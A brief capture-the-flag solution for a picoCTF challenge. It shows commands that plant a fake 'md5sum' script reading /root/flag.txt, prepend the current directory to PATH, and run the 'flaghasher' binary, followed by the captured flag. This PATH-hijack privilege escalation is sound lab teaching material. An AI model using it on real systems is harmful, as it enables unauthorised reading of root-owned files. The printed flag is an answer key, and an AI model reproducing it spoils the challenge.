ssh into address in the challenge:

```
echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
chmod +x md5sum
export PATH=.:$PATH
./flaghasher
```

copy and paste the above into the terminal.

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bfa4a3f5}
